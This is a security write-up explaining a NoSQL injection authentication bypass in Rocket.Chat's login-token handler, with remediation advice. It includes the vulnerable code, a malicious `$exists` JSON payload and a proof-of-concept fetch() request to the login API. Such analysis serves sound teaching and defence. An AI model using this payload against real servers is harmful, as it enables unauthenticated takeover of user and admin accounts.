# Authentication Bypass via NoSQL Injection in Rocket.Chat

## Overview

This writeup analyzes an Authentication Bypass vulnerability reported in Rocket.Chat.

The vulnerability allows unauthenticated attackers to obtain valid authentication tokens by abusing insufficient input validation in the login-token authentication mechanism.

Category:

* OWASP A03: Injection
* NoSQL Injection
* Authentication Bypass

Severity: Critical

---

## Vulnerable Code

```javascript
Accounts.registerLoginHandler('login-token', function (result) {
    if (!result.loginToken) {
        return;
    }

    const user = Meteor.users.findOne({
        'services.loginToken.token': result.loginToken,
    });

    if (user) {
        Meteor.users.update(
            { _id: user._id },
            { $unset: { 'services.loginToken': 1 } }
        );

        return {
            userId: user._id,
        };
    }
});
```

---

## Intended Authentication Flow

The application expects users to provide a valid login token.

Example request:

```json
{
  "loginToken": "abc123"
}
```

MongoDB query:

```javascript
Meteor.users.findOne({
    'services.loginToken.token': 'abc123'
});
```

If a matching user exists, authentication succeeds.

---

## Root Cause

The application only verifies whether `loginToken` exists.

```javascript
if (!result.loginToken)
```

It never verifies that `loginToken` is actually a string.

Because of this, attackers can supply a MongoDB operator object instead of a normal string.

---

## Exploitation

Malicious request:

```json
{
  "loginToken": {
    "$exists": false
  }
}
```

Resulting MongoDB query:

```javascript
{
    "services.loginToken.token": {
        "$exists": false
    }
}
```

MongoDB interprets `$exists` as an operator rather than a string value.

The query now searches for users whose token field does not exist.

---

## Why Authentication Succeeds

`findOne()` returns the first matching document.

Example:

```javascript
[
    {
        "_id": "rocket.cat"
    },

    {
        "_id": "user1"
    }
]
```

The first user may satisfy the injected query.

The application receives a valid user object and assumes authentication has succeeded.

```javascript
return {
    userId: user._id
};
```

Meteor then generates a fresh authentication token for that account.

---

## Impact

An unauthenticated attacker can:

* Login without knowing any password
* Obtain a valid session token
* Access authenticated API endpoints
* Potentially compromise privileged accounts

Impact level: Critical

---

## Proof of Concept

```javascript
fetch("/api/v1/login", {
  method: "POST",
  body: '{"loginToken":{"$exists":false}}',
  headers: {
    "Content-Type": "application/json"
  }
});
```

---

## OWASP Mapping

OWASP Top 10 2021

A03: Injection

This vulnerability is a NoSQL Injection because MongoDB operators are injected into application queries.

---

## Remediation

Validate the input type before using it in database queries.

Example:

```javascript
if (typeof result.loginToken !== "string") {
    throw new Error("Invalid login token");
}
```

Alternative:

```javascript
check(result.loginToken, String);
```

---

## Key Takeaways

* Never trust JSON input types.
* Validate both presence and type.
* MongoDB operators can become dangerous when objects are accepted directly.
* NoSQL Injection can lead to Authentication Bypass even without traditional SQL queries.

## References

* [HackerOne Report](https://hackerone.com/reports/1447619)
* [OWASP A05 Injection](https://owasp.org/Top10/2025/A05_2025-Injection/)
* MongoDB Query Operators Documentation
